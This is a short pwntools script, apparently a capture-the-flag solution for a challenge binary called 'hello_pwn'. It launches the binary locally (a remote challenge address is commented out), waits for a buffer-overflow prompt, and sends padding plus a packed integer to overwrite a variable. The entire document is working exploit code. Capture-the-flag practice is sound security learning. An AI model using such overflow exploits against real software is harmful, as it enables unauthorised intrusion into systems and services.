from pwn import *

context.log_level = 'debug'
#p = remote('10.10.49.194', 30153)
p = process('./hello_pwn')

p.recvuntil('lets get helloworld for bof\n')
padding = "A"*4

count = p64(1853186401)
shellcode = padding + count

p.send(shellcode)

print p.recv()
